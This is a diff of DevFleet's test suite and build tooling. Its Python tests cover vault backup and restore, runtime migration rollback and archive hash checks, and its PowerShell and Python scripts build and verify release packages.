-
-
-## FILE: source/tests/test_vault_metadata_identity_integration.py
-
-SHA256: f5340252c6b2410b726c4529c51ecef9ec9aab60b41c5ca3cef989573668b9d3 | Bytes: 3801 | Git mode: 100644
-
-```
-import importlib.util
-from importlib.machinery import SourceFileLoader
-import pytest
-from pathlib import Path
-
-
-ROOT = Path(__file__).resolve().parents[1]
-
-
-def _broker():
-    pytest.importorskip("pwd", reason="Vault broker is POSIX-only")
-    spec = importlib.util.spec_from_loader("vault_broker", SourceFileLoader("vault_broker", str(ROOT / "linux" / "devfleet-vault-broker")))
-    module = importlib.util.module_from_spec(spec)
-    assert spec.loader is not None
-    spec.loader.exec_module(module)
-    return module
+    assert result['backup_status'] == 'verified'
+    assert saved['schema_version'] == 5
+    assert saved['deployment_id'] == SETTINGS.deployment_id
+    assert saved['runtime_id'] == projects.compose_name(slug)
+    assert saved['backup_status'] == 'verified'
+    assert inspected['ok'] is True and inspected['running'] is False
+    snapshots = sorted(
+        (SETTINGS.runtime_root / 'runtime-migrations').glob(f'{slug}-*.json')
+    )
+    assert snapshots
+    migration = json.loads(snapshots[-1].read_text(encoding='utf-8'))
+    assert migration['backup_status'] == 'verified-local-and-vault'
+    assert migration['backup_artifact']['sha256']
 
 
-def test_broker_delegates_descriptor_safe_identity_to_installed_helper(monkeypatch, tmp_path):
-    broker = _broker()
-    calls = []
+def test_vm_to_container_failure_restores_retained_workspace_and_running_vm(monkeypatch: pytest.MonkeyPatch):
+    slug = 'v124-rollback-vm'
+    make_project(slug, runtime='vm', lifecycle='running')
+    restored: list[dict] = []
+    calls: list[str] = []
+    monkeypatch.setattr(projects, 'backup_project', lambda _slug: json.dumps({'backup_status': 'verified'}))
+    monkeypatch.setattr(projects, 'sync_project_vm_ssh_alias', lambda *args, **kwargs: {'ok': True})
+    monkeypatch.setattr(projects.VM_RUNTIME, 'export_to_source', lambda *args, **kwargs: {'state': 'verified', 'workspace_path': f'/home/devrunner/workspaces/{slug}', 'previous_workspace_path': f'/home/devrunner/workspaces/{slug}-before-vm-export-0123456789abcdef0123456789abcdef'})
+    monkeypatch.setattr(projects.VM_RUNTIME, 'restore_previous_source', lambda *args, **kwargs: restored.append(kwargs) or {'state': 'restored'})
+    monkeypatch.setattr(
+        projects.VmRuntimeOperations,
+        'start',
+        staticmethod(lambda value, _meta: calls.append(f'vm-rollback-start:{value}') or {'state': 'running'}),
+    )
+    monkeypatch.setattr(projects, 'stop_project', lambda value: calls.append(f'stop:{value}') or 'stopped')
+    attempts = {'count': 0}
+    def start(value: str) -> str:
+        attempts['count'] += 1; calls.append(f'start:{value}')
+        if attempts['count'] == 1: raise RuntimeError('destination start failed')
+        return 'restored'
+    monkeypatch.setattr(projects, 'start_project', start)
 
-    class Result:
-        returncode = 0
+    with pytest.raises(RuntimeError, match='destination start failed'):
+        projects.assign_project_runtime(slug, 'container', 'small')
 
-    monkeypatch.setattr(broker.subprocess, "run", lambda command, **kwargs: calls.append((command, kwargs)) or Result())
-    assert broker._restored_identity_matches(tmp_path, "demo", "12345678-1234-1234-1234-123456789012")
-    command, kwargs = calls[-1]
-    assert command == ["python3", "-I", "/opt/devfleet/devfleet/metadata_io.py", "--identity", str(tmp_path), "demo", "12345678-1234-1234-1234-123456789012"]
-    assert kwargs["stdin"] is broker.subprocess.DEVNULL
-    assert kwargs["stdout"] is broker.subprocess.DEVNULL
-    assert kwargs["stderr"] is broker.subprocess.DEVNULL
-
-
-def test_broker_binds_transfer_identity_arguments(monkeypatch, tmp_path):
-    broker = _broker()
-    seen = []
-    monkeypatch.setattr(broker.subprocess, "run", lambda command, **kwargs: seen.append(command) or type("R", (), {"returncode": 0})())
-    assert broker._restored_identity_matches(tmp_path, "demo", "12345678-1234-1234-1234-123456789012", "12345678-1234-1234-1234-123456789013", "failover")
-    assert seen[0][-2:] == ["12345678-1234-1234-1234-123456789013", "failover"]
-
-
-def test_broker_rejects_standalone_canonical_action(monkeypatch):
-    broker = _broker()
-    with pytest.raises(broker.ProtocolError):
-        broker._parse_request({"action": "restore-canonical", "project": "demo", "project_id": "12345678-1234-1234-1234-123456789012"})
-    assert "restore-canonical" not in (ROOT / "linux" / "devfleet-vault-request").read_text(encoding="utf-8")
-
-
-def test_broker_attempts_quarantine_on_invalid_recovered_identity(monkeypatch, tmp_path):
-    broker = _broker()
-    broker.WORKSPACES = tmp_path
-    # Supply the external configuration precondition; never read real credentials.
-    monkeypatch.setattr(broker.os, "access", lambda path, mode: path == "/etc/devfleet/restic.env")
-    target = tmp_path / "demo-recovered-20260916-123456-deadbeef"
-    target.mkdir()
-    monkeypatch.setattr(broker, "_run_child", lambda *_args, **_kwargs: type("R", (), {"returncode": 0, "stdout": str(target) + "\n"})())
-    monkeypatch.setattr(broker, "_restored_identity_matches", lambda *_args: False)
-    quarantined = []
-    monkeypatch.setattr(broker, "_quarantine_invalid_copy", lambda path, project: quarantined.append((path, project)) or True)
-    result = broker._run_fixed_operation("restore-copy", "demo", "12345678-1234-1234-1234-123456789012")
-    assert result["ok"] is False and quarantined == [(target, "demo")]
+    assert restored and restored[0]['previous_workspace_path'].endswith('0123456789abcdef0123456789abcdef')
+    assert calls.count(f'start:{slug}') == 1
+    assert calls.count(f'vm-rollback-start:{slug}') == 1
 
 
-def test_restore_shell_uses_metadata_io_identity_cli():
-    script = (ROOT / "linux" / "devfleet-restore-project").read_text(encoding="utf-8")
-    assert "python3 -I /opt/devfleet/devfleet/metadata_io.py --identity" in script
-    assert "jq -e --arg slug" not in script
+def test_schema2_vault_failure_restores_exact_metadata_before_any_runtime_action(
+    monkeypatch: pytest.MonkeyPatch,
+):
+    slug = 'v124-schema2-vault-rollback'
+    make_project(slug, runtime='container', lifecycle='stopped')
+    project = SETTINGS.workspaces / slug
+    metadata_path = project / '.devfleet/project.json'
+    before = metadata_path.read_bytes()
+    monkeypatch.setattr(projects, 'running', lambda _project: False)
+    monkeypatch.setattr(
+        projects,
+        'backup_project',
+        lambda _slug: (_ for _ in ()).throw(RuntimeError('vault unavailable')),
+    )
+    monkeypatch.setattr(
+        projects,
+        'start_project',
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            AssertionError('stopped source must not be started during rollback')
+        ),
+    )
+    monkeypatch.setattr(
+        projects,
+        'stop_project',
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            AssertionError('stopped source must not be stopped during rollback')
+        ),
+    )
+
+    with pytest.raises(RuntimeError, match='vault unavailable'):
+        projects.assign_project_runtime(slug, 'container', 'small')
+
+    assert metadata_path.read_bytes() == before
+    restored = json.loads(metadata_path.read_text(encoding='utf-8'))
+    assert restored['schema_version'] == 2
 
 
-def test_restore_shell_quarantines_unmarked_recovered_target_after_move():
-    script = (ROOT / "linux" / "devfleet-restore-project").read_text(encoding="utf-8")
-    assert 'if [[ "$mode" != --canonical ]] && ! workspace_identity_matches "$target"' in script
-    assert 'vault-recovery-invalid-$stamp-$project' in script
-    assert 'Recovered workspace identity failed; the unmarked copy was quarantined.' in script
+def test_local_migration_restore_rejects_archive_hash_drift(
+    monkeypatch: pytest.MonkeyPatch, tmp_path
+):
+    archive = tmp_path / 'migration.workspace.tar.gz'
+    archive.write_bytes(b'tampered archive')
+    monkeypatch.setattr(
+        projects,
+        'restore_workspace_archive',
+        lambda *_args, **_kwargs: (_ for _ in ()).throw(
+            AssertionError('unverified migration archive reached restore')
+        ),
+    )
 
-```
-
-
-## FILE: source/tests/test_verify_package_watchdog.py
-
-SHA256: 51cb998ef256cd58f3c6f63c63d23aa330566f0f4030c7f7237eb962967c3d4c | Bytes: 974 | Git mode: 100644
-
-```
-import sys
-from pathlib import Path
-
-import pytest
-
-
-TOOLS = Path(__file__).parents[1] / "tools"
-sys.path.insert(0, str(TOOLS))
-from verify_package import run_bounded  # noqa: E402
-
-
-def test_verify_package_watchdog_allows_normal_success():
-    result = run_bounded([sys.executable, "-c", "print('ok')"], timeout=5, label="normal test")
-    assert result.returncode == 0
-    assert result.stdout.strip() == "ok"
-
-
-def test_verify_package_watchdog_reports_timeout():
-    with pytest.raises(RuntimeError, match="timeout"):
-        run_bounded([sys.executable, "-c", "import time; time.sleep(30)"], timeout=0.2, label="sleeping hook")
-
-
-def test_verify_package_watchdog_reports_output_flood():
-    with pytest.raises(RuntimeError, match="output limit"):
-        run_bounded(
-            [sys.executable, "-c", "import sys; sys.stdout.write('x' * 1000000); sys.stdout.flush()"],
-            timeout=5,
-            output_limit=4096,
-            label="flooding hook",
+    with pytest.raises(ValueError, match='SHA-256 mismatch'):
+        projects._restore_local_migration_backup(
+            tmp_path / 'project',
+            'v124-hash-check',
+            {'path': str(archive), 'sha256': '0' * 64},
         )
 
 ```
 
 
-## FILE: source/tests/test_worktrees_and_v1_restore.py
+## FILE: source/tests/test_v124_vm_backups.py
 
-SHA256: 7cf54e4291b6c4df1063afb2ab5113bf35b78498c8f035ac1633d3c41d7c3b2f | Bytes: 3037 | Git mode: 100644
+SHA256: 635be7cf6db6bcc88cbae397e782da8c586aef63d6824ad0f3bc6bcf2959fb48 | Bytes: 3936 | Git mode: 100644
 
 ```
-import json,shutil,subprocess,uuid
+import tarfile
 from pathlib import Path
-from devfleet import projects, workspace_archives
+
+import pytest
+
+from devfleet import projects
+from devfleet.core import SETTINGS, atomic_json
+from devfleet.workspace_archives import create_workspace_archive
+
+
+ROOT = Path(__file__).resolve().parents[1]
+
+
+def _vm_project(slug: str) -> Path:
+    project = SETTINGS.workspaces / slug
+    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
+    atomic_json(project / ".devfleet/project.json", {
+        "schema_version": 3,
+        "managed_by": "devfleet",
+        "project_id": "11111111-1111-1111-1111-111111111111",
+        "slug": slug,
+        "host_id": "test-node",
+        "runtime_isolation": "vm",
+        "runtime_provider": "multipass-host-agent",
+        "runtime_id": f"devfleet-project-{slug}",
+    })
+    return project
+
+
+def test_vm_backup_history_uses_host_provider(monkeypatch):
+    slug = "v124-vm-history"
+    project = _vm_project(slug)
+    expected = [{"backup_id": "v124-vm-history-20260810-000000-deadbeef", "provider": "multipass-host-agent", "restore_eligible": True}]
+    monkeypatch.setattr(projects.VM_RUNTIME, "list_backups", lambda selected, metadata: expected)
+    try:
+        assert projects.list_backups(slug) == expected
+    finally:
+        import shutil
+        shutil.rmtree(project, ignore_errors=True)
+
+
+def test_vm_restore_requires_deliberate_overwrite_confirmation(monkeypatch):
+    slug = "v124-vm-restore"
+    project = _vm_project(slug)
+    called = []
+    monkeypatch.setattr(projects.VM_RUNTIME, "restore_backup", lambda selected, metadata, backup_id, confirm_restore=False: called.append((backup_id, confirm_restore)) or {"backup_sha256": "a" * 64})
+    try:
+        with pytest.raises(ValueError, match="overwrite confirmation"):
+            projects.restore_backup(slug, "v124-vm-restore-20260810-000000-deadbeef", confirm_restore=True, allow_overwrite=False)
+        result = projects.restore_backup(slug, "v124-vm-restore-20260810-000000-deadbeef", confirm_restore=True, allow_overwrite=True)
+        assert result["provider"] == "multipass-host-agent"
+        assert called == [("v124-vm-restore-20260810-000000-deadbeef", True)]
+    finally:
+        import shutil
+        shutil.rmtree(project, ignore_errors=True)
+
+
+def test_generated_symlink_directory_is_excluded_from_workspace_archive(tmp_path):
+    slug = "generated-exclusion"
+    workspace = tmp_path / slug
+    (workspace / ".devfleet").mkdir(parents=True)
+    (workspace / ".devfleet/project.json").write_text('{"project_id":"11111111-1111-1111-1111-111111111111"}', encoding="utf-8")
+    (workspace / "src").mkdir()
+    (workspace / "src/main.js").write_text("console.log('ok')", encoding="utf-8")
+    generated_bin = workspace / "node_modules/.bin"
+    generated_bin.mkdir(parents=True)
+    target = workspace / "node_modules/tool.js"
+    target.write_text("generated", encoding="utf-8")
+    try:
+        (generated_bin / "tool").symlink_to(target)
+    except OSError:
+        pytest.skip("Symlink creation is unavailable on this platform")
+    archive = tmp_path / "workspace.tar.gz"
+    result = create_workspace_archive(workspace, slug, archive)
+    assert "node_modules" in result["generated_dirs"]
+    with tarfile.open(archive, "r:gz") as handle:
+        names = handle.getnames()
+    assert f"{slug}/src/main.js" in names
+    assert not any("node_modules" in name for name in names)
+
+
+def test_host_agent_backup_and_export_share_generated_directory_exclusions():
+    source = (ROOT / "windows/DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
+    assert "function New-VerifiedRemoteWorkspaceArchive" in source
+    assert 'excluded = {"node_modules", ".next", "build", "dist", ".venv", "venv", ".pytest_cache", "__pycache__", ".test-runtime"}' in source
+    assert source.count("New-VerifiedRemoteWorkspaceArchive $Record.vm_name $remoteArchive") >= 2
+    assert all(operation in source for operation in ("'list-backups'", "'inspect-backup'", "'restore-backup'"))
+
+```
+
+
+## FILE: source/tests/test_v124_vm_creation_ssh.py
+
+SHA256: 705b439b834162d0890b8b4b4bb42ed66dc300e76b409de537520323dd8ebe6c | Bytes: 6592 | Git mode: 100644
+
+```
+import json
+import shutil
+import uuid
+from pathlib import Path
+
+import pytest
+
+import devfleet.projects as projects
 from devfleet.core import SETTINGS
 
-ROOT=Path(__file__).resolve().parents[1]
 
-def git(cwd,*args):
- return subprocess.run(['git',*args],cwd=cwd,text=True,capture_output=True,check=True)
-
-def test_git_worktree_project_creation(monkeypatch):
- source=SETTINGS.workspaces/f'source-{uuid.uuid4().hex[:8]}'
- dest_slug=f'worktree-{uuid.uuid4().hex[:8]}'
- dest=SETTINGS.workspaces/dest_slug
- source.mkdir(parents=True)
- try:
-  git(source,'init');git(source,'config','user.name','DevFleet Test');git(source,'config','user.email','devfleet@example.invalid')
-  (source/'seed.txt').write_text('seed');git(source,'add','.');git(source,'commit','-m','seed');git(source,'branch','feature')
-  monkeypatch.setattr(projects,'TEMPLATE_ROOT',ROOT/'templates')
-  meta=projects.create_project(dest_slug,template='generic',worktree_source=source.name,worktree_branch='feature',use_ollama=False)
-  assert meta['worktree'] and (dest/'.git').is_file() and json.loads((dest/'.devfleet/project.json').read_text())['identity']==dest_slug
- finally:
-  if dest.exists():subprocess.run(['git','worktree','remove','--force',str(dest)],cwd=source,check=False)
-  shutil.rmtree(source,ignore_errors=True);shutil.rmtree(dest,ignore_errors=True)
-
-def test_v1_project_without_schema2_metadata_remains_discoverable(tmp_path):
- project=tmp_path/'legacy-project';project.mkdir()
- meta=projects.load_meta(project)
- assert meta['slug']=='legacy-project' and meta['template']=='existing'
- assert meta['runtime_provider']=='docker-compose' and meta['resource_profile']=='standard'
- assert meta['resource_limits']['memory_gb']==4.0 and meta['resource_limits']['cpus']==2.0
-
-def test_canonical_vault_restore_quarantines_existing_v1_copy():
- text=(ROOT/'linux/devfleet-restore-project').read_text()
- assert 'transfer-replaced-' in text and 'mv -T --no-clobber -- "$target" "$quarantine"' in text
- assert 'Canonical restore could not quarantine the existing workspace.' in text
-
-def test_workspace_restore_failure_restores_previous_canonical(tmp_path,monkeypatch):
- slug='rollback-fixture'
- source=tmp_path/slug;source.mkdir();(source/'old.txt').write_text('old');(source/'.devfleet').mkdir();(source/'.devfleet/project.json').write_text(json.dumps({'slug':slug,'schema_version':2}))
- archive=tmp_path/'backup.tar.gz'
- workspace_archives.create_workspace_archive(source,slug,archive)
- (source/'old.txt').write_text('original-must-survive')
- original=workspace_archives.inspect_workspace
- calls={'count':0}
- def fail_after_promotion(path):
-  calls['count']+=1
-  if calls['count'] == 1:
-   raise RuntimeError('injected post-promotion failure')
-  return original(path)
- monkeypatch.setattr(workspace_archives,'inspect_workspace',fail_after_promotion)
- try:
-  workspace_archives.restore_workspace_archive(archive,source,slug)
- except RuntimeError:
-  pass
- else:
-  raise AssertionError('fault injection did not fail')
- assert (source/'old.txt').read_text() == 'original-must-survive'
-
-```
+def _template(project: Path, _name: str) -> None:
+    control = project / ".devfleet"
+    control.mkdir(parents=True, exist_ok=True)
+    (control / "template.json").write_text(json.dumps({
+        "bootstrap_command": "./.devfleet/bootstrap.sh",
+        "health_command": "./.devfleet/health-check.sh",
+        "test_command": "./.devfleet/smoke-test.sh",
+    }), encoding="utf-8")
 
 
-## FILE: source/tools/Build-InstallerSourceZip.ps1
-
-SHA256: 8b654e01e2be6f4faa42628be4168e9c349348a8dac29fa8cbf5d24bf86badcf | Bytes: 2625 | Git mode: 100644
-
-```
-[CmdletBinding()]
-param(
-    [Parameter(Mandatory)][string]$SourceRoot,
-    [Parameter(Mandatory)][string]$InstallerRoot,
-    [Parameter(Mandatory)][string]$OutputPath
-)
-$ErrorActionPreference = 'Stop'
-Add-Type -AssemblyName System.IO.Compression, System.IO.Compression.FileSystem
-$sourceRootResolved = (Resolve-Path -LiteralPath $SourceRoot).Path
-$sourceCandidate = Join-Path $sourceRootResolved 'source'
-$source = if (Test-Path -LiteralPath (Join-Path $sourceCandidate 'VERSION')) { (Resolve-Path -LiteralPath $sourceCandidate).Path } else { $sourceRootResolved }
-$installer = (Resolve-Path -LiteralPath $InstallerRoot).Path
-$output = [IO.Path]::GetFullPath($OutputPath)
-New-Item -ItemType Directory -Force -Path ([IO.Path]::GetDirectoryName($output)) | Out-Null
-if ([IO.File]::Exists($output)) { [IO.File]::Delete($output) }
-
-$excluded = @(
-    '\.git([\\/]|$)',
-    '(^|[\\/])(bin|obj|node_modules|__pycache__|\.pytest_cache|\.test-runtime|\.venv[^\\/]*|test-images|outputs|audit|dotnet-sdk)([\\/]|$)',
-    '(^|[\\/])DevFleet\.Setup([\\/])Payload([\\/]).*\.(tar\.gz|exe)$',
-    '\.(vhd|vhdx|avhdx|iso|exe)$'
-)
-$seen = @{}
-$zip = [IO.Compression.ZipFile]::Open($output, [IO.Compression.ZipArchiveMode]::Create)
-try {
-    foreach ($root in @($source, $installer)) {
-        foreach ($file in Get-ChildItem -LiteralPath $root -Recurse -File | Sort-Object FullName) {
-            $relative = ([Uri]::new(($root.TrimEnd('\') + '\')).MakeRelativeUri([Uri]::new($file.FullName)).ToString()).Replace('/','/')
-            if ($excluded | Where-Object { $relative -match $_ }) { continue }
-            $entryName = $relative
-            if ($seen.ContainsKey($entryName)) {
-                if ($root -eq $installer -and $entryName -eq 'dependencies.json') { continue }
-                $existingHash = $seen[$entryName]
-                $currentHash = (Get-FileHash -LiteralPath $file.FullName -Algorithm SHA256).Hash
-                if ($existingHash -ne $currentHash) { throw "Source archive collision with different contents: $entryName" }
-                continue
-            }
-            $entry = $zip.CreateEntry($entryName, [IO.Compression.CompressionLevel]::Optimal)
-            $input = [IO.File]::OpenRead($file.FullName); $outputStream = $entry.Open()
-            try { $input.CopyTo($outputStream) } finally { $outputStream.Dispose(); $input.Dispose() }
-            $seen[$entryName] = (Get-FileHash -LiteralPath $file.FullName -Algorithm SHA256).Hash
-        }
-    }
-} finally { $zip.Dispose() }
-$result = Get-Item -LiteralPath $output
-Write-Host "Installer source archive generated: $output ($($result.Length) bytes)"
-
-```
+def _template_metadata(_name: str) -> dict:
+    return {"language": "python", "framework": "fastapi", "language_rationale": "test", "template_maturity": "stable"}
 
 
-## FILE: source/tools/Verify-Package.ps1
+def _prepare(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(projects, "_copy_template", _template)
+    monkeypatch.setattr(projects, "template_metadata", _template_metadata)
 
-SHA256: 823ed5d1f17bf4b46a0f8f306ff73833df46ab50221734ff5116a8cac7e84cec | Bytes: 3453 | Git mode: 100644
 
-```
-[CmdletBinding()]
-param([switch]$SkipChecksums)
-$ErrorActionPreference='Stop'
-$root=Split-Path -Parent $PSScriptRoot
-$required=@('VERSION','README-FIRST.md','Upgrade-DevFleet.ps1','DevFleet-v1.1.0-MIGRATION.md','DevFleet-v1.1.0-VALIDATION.md','DevFleet-v1.1.0-FILE-CHANGES.md','config\devfleet.config.json','config\ollama-profiles.json','client\Configure-SSH.ps1','client\Configure-DockerContext.ps1','windows\Migrate-Config.ps1','windows\Configure-Ollama.ps1','windows\Set-DevFleetDockerMode.ps1','linux\devfleet-switch-docker-mode','app\devfleet\main.py','docs\13-PERFORMANCE-TUNING.md')
-foreach($r in $required){if(-not(Test-Path(Join-Path $root $r))){throw "Missing $r"}}
-$errors=@();Get-ChildItem $root -Recurse -File|Where-Object Extension -in @('.ps1','.psm1')|ForEach-Object{$tokens=$null;$parse=$null;[void][System.Management.Automation.Language.Parser]::ParseFile($_.FullName,[ref]$tokens,[ref]$parse);foreach($e in $parse){$errors+="$($_.FullName):$($e.Extent.StartLineNumber): $($e.Message)"}};if($errors){throw "PowerShell parsing failed:`n$($errors -join "`n")"}
-$jsonErrors=@();Get-ChildItem $root -Recurse -File -Filter *.json|Where-Object{$_.FullName -notmatch '[\\/](\.git|\.pytest_cache|\.test-runtime|__pycache__|runtime-migrations)[\\/]'}|ForEach-Object{try{[void](Get-Content $_.FullName -Raw|ConvertFrom-Json)}catch{$jsonErrors+="$($_.FullName): $($_.Exception.Message)"}};if($jsonErrors){throw "JSON parsing failed:`n$($jsonErrors -join "`n")"}
-$version=(Get-Content -LiteralPath (Join-Path $root 'VERSION') -Raw).Trim();$cfg=Get-Content (Join-Path $root 'config\devfleet.config.json') -Raw|ConvertFrom-Json;if([int]$cfg.SchemaVersion -ne 2 -or [string]$cfg.PackageVersion -ne $version){throw "Default configuration is not schema 2 / v$version."}
-$transientPackageParts=@('.git','.pytest_cache','.test-runtime','__pycache__','runtime-migrations','outputs','audit-extract');$bad=Get-ChildItem $root -Recurse -File|Where-Object{$relative=$_.FullName.Substring($root.Length).TrimStart([char]92,[char]47).Replace([char]92,[char]47);$parts=$relative.Split('/');$generated=($parts|Where-Object{$_ -eq '.venv' -or $_ -like '.venv-*' -or $transientPackageParts -contains $_}).Count -gt 0;(-not $generated) -and $_.Length -eq 0 -and $_.Name -ne '__init__.py'};if($bad){throw "Unexpected empty files: $($bad.FullName -join ', ')"}
-if(-not $SkipChecksums){$manifest=Join-Path $root 'CHECKSUMS.sha256';foreach($line in Get-Content $manifest){if($line -notmatch '^([0-9a-f]{64})  (.+)$'){continue};$expected=$Matches[1];$rel=$Matches[2].Replace('/','\');$path=Join-Path $root $rel;if(-not(Test-Path $path)){throw "Missing checksum target $rel"};$actual=(Get-FileHash $path -Algorithm SHA256).Hash.ToLowerInvariant();if($actual -ne $expected){$bytes=[IO.File]::ReadAllBytes($path);$hasLoneCr=$false;for($i=0;$i -lt $bytes.Length;$i++){if($bytes[$i] -eq 13 -and ($i+1 -ge $bytes.Length -or $bytes[$i+1] -ne 10)){$hasLoneCr=$true;break}};if(-not $hasLoneCr -and ($bytes -contains 13)){$normalized=[Text.Encoding]::UTF8.GetBytes(([Text.Encoding]::UTF8.GetString($bytes) -replace "`r`n", "`n"));$sha=[Security.Cryptography.SHA256]::Create();try{$actual=([BitConverter]::ToString($sha.ComputeHash($normalized))).Replace('-','').ToLowerInvariant()}finally{$sha.Dispose()}}};if($actual -ne $expected){throw "Checksum mismatch $rel"}}}
-Write-Host 'Package structure, PowerShell AST syntax, JSON/schema, and checksums verified.' -ForegroundColor Green
+def test_vm_create_returns_coherent_metadata_and_syncs_host_alias(monkeypatch: pytest.MonkeyPatch):
+    slug = f"v124-vm-create-{uuid.uuid4().hex[:8]}"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+    _prepare(monkeypatch)
+    calls: list[tuple] = []
+    runtime_id = f"devfleet-project-{slug}"
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": runtime_id, "address": "10.0.0.44", "state": "ready"}))
+    monkeypatch.setattr(projects, "import_project_workspace", lambda *_args, **_kwargs: {"ok": True, "workspace_preserved": True, "address": "10.0.0.44"})
+    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda slug, runtime_id, *, project_id: calls.append((slug, runtime_id, project_id)) or {"validated": True})
+
+    result = projects.create_project(slug, template="generic", runtime_isolation="vm", use_ollama=False)
+
+    for key in ("project_id", "slug", "runtime_isolation", "runtime_provider", "runtime_id", "runtime_address", "ssh_alias", "workspace_host", "workspace_path", "resource_profile", "resource_limits", "provisioning_status", "lifecycle_status", "health_status", "health_scope"):
+        assert key in result
+    assert result["runtime_isolation"] == "vm"
+    assert result["runtime_provider"] == "multipass-host-agent"
+    assert result["runtime_id"] == result["ssh_alias"] == runtime_id
+    assert result["runtime_address"] == result["workspace_host"] == "10.0.0.44"
+    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
+    assert result["health_status"] == "unknown"
+    assert result["health_scope"] == "workspace-ready-not-app-healthy"
+    assert calls == [(slug, result["runtime_id"], result["project_id"])]
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+
+
+def test_container_create_returns_metadata(monkeypatch: pytest.MonkeyPatch):
+    slug = f"v124-container-create-{uuid.uuid4().hex[:8]}"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+    _prepare(monkeypatch)
+
+    result = projects.create_project(slug, template="generic", runtime_isolation="container", use_ollama=False)
+
+    assert isinstance(result, dict)
+    assert result["slug"] == slug
+    assert result["runtime_isolation"] == "container"
+    assert result["runtime_provider"] == "docker-compose"
+    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
+    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
+
+
+def test_worktree_to_vm_is_rejected_before_provider_ensure(monkeypatch: pytest.MonkeyPatch):
+    token = uuid.uuid4().hex[:8]
+    source_slug, destination_slug = f"v124-worktree-source-{token}", f"v124-worktree-vm-{token}"
+    source, destination = SETTINGS.workspaces / source_slug, SETTINGS.workspaces / destination_slug
+    shutil.rmtree(source, ignore_errors=True)
+    shutil.rmtree(destination, ignore_errors=True)
+    (source / ".git").mkdir(parents=True)
+    ensured: list[object] = []
+    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_args: ensured.append(True)))
+
+    with pytest.raises(ValueError, match="Worktree-to-VM provisioning is blocked"):
+        projects.create_project(destination_slug, template="generic", runtime_isolation="vm", worktree_source=source_slug, worktree_branch="feature", use_ollama=False)
+
+    assert ensured == []
+    assert not destination.exists()
+    shutil.rmtree(source, ignore_errors=True)
+
+
+def test_host_control_alias_operation_is_fixed_and_structured(monkeypatch: pytest.MonkeyPatch):
+    import devfleet.host_control as host_control
+
+    received: dict = {}
+    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id: received.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})
+
+    assert host_control.sync_project_vm_ssh_alias("v124-alias", "devfleet-project-v124-alias", project_id="12345678-1234-1234-1234-123456789abc") == {"ok": True}
+    assert received == {"operation": "sync-ssh-alias", "payload": {"slug": "v124-alias", "project_id": "12345678-1234-1234-1234-123456789abc"}, "runtime_id": "devfleet-project-v124-alias"}
+
+
+def test_host_agent_readiness_probe_runs_with_required_privilege():
+    root = Path(__file__).resolve().parents[1]
+    script = (root / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
+
+    assert "@('exec',$VmName,'--','sudo','/usr/local/sbin/devfleet-project-health')" in script
+    assert "@('exec',$SourceVm,'--','sudo','tar','-czf',$sourceArchive" in script
+    assert "@('exec',$record.vm_name,'--','sudo','find',$targetPath" in script
+    assert "@('exec',$Record.vm_name,'--','sudo','-u','devrunner','bash','--noprofile','--norc','-lc'" in script
+    assert "exec $cmd" in script
+    assert "workspace boundary validation failed" in script
+    assert '$keyProperty="    ssh_authorized_keys:`n      - \'$key\'"' in script
+    assert "Configured DevFleet SSH public key is not available" in script
+
+
+def test_vm_runtime_compatibility_facade_routes_trusted_commands(monkeypatch: pytest.MonkeyPatch):
+    import devfleet.runtime as runtime
+
+    received: dict = {}
+    monkeypatch.setattr(runtime.VM_RUNTIME, "command", lambda slug, metadata, operation, *, command_key="", tail=150: received.update(slug=slug, metadata=metadata, operation=operation, command_key=command_key, tail=tail) or {"ok": True})
+
+    assert runtime.VmRuntimeOperations.command("demo", {"project_id": "id"}, "project-test", command_key="test", tail=42) == {"ok": True}
+    assert received == {"slug": "demo", "metadata": {"project_id": "id"}, "operation": "project-test", "command_key": "test", "tail": 42}
 
 ```
 
 
-## FILE: source/tools/build_release.py
+## FILE: source/tests/test_v125_jobfinder_hotfix.py
 
-SHA256: 59e38747a1c410ea7710b522c5bb2dab73adb841e892503c87114aed97dc5712 | Bytes: 8017 | Git mode: 100644
+SHA256: f8f3e5ce386a3ce3b8c85a0514a09bbb702e935f716e4cd5e8b3c98e44f3b0da | Bytes: 12515 | Git mode: 100644
 
 ```
-"""Reproducible DevFleet TAR and portable bundle builder."""
-from __future__ import annotations
-
-import argparse
-import gzip
-import hashlib
 import json
-import re
-import stat
-import tarfile
-import zipfile
 from pathlib import Path
 
-from hook_modes import executable_template_hooks, hook_mode_manifest
+import pytest
 
-TRANSIENT = {".git", ".pytest_cache", ".test-runtime", "__pycache__", "runtime-migrations"}
-
-
-def is_transient_part(part: str) -> bool:
-    return part in TRANSIENT or part.startswith(".venv")
+import devfleet.projects as projects
+from devfleet import host_control, main
+from devfleet.core import SETTINGS
 
 
-def files(root: Path) -> list[Path]:
-    candidates = (
-        p
-        for p in root.rglob("*")
-        if p.is_file()
-        and not any(is_transient_part(part) for part in p.relative_to(root).parts)
-    )
-    return sorted(
-        candidates,
-        key=lambda path: path.relative_to(root).as_posix().encode("utf-8"),
-    )
+LIFECYCLE = {
+    "start_command": "docker compose up -d --build",
+    "stop_command": "docker compose down --remove-orphans",
+    "restart_command": "docker compose restart",
+    "rebuild_command": "docker compose build && docker compose up -d",
+    "logs_command": "docker compose logs",
+}
+PROJECT_ID = "12345678-1234-1234-1234-123456789abc"
 
 
-def sha256(path: Path) -> str:
-    digest = hashlib.sha256()
-    with path.open("rb") as stream:
-        for chunk in iter(lambda: stream.read(1024 * 1024), b""):
-            digest.update(chunk)
-    return digest.hexdigest()
-
-
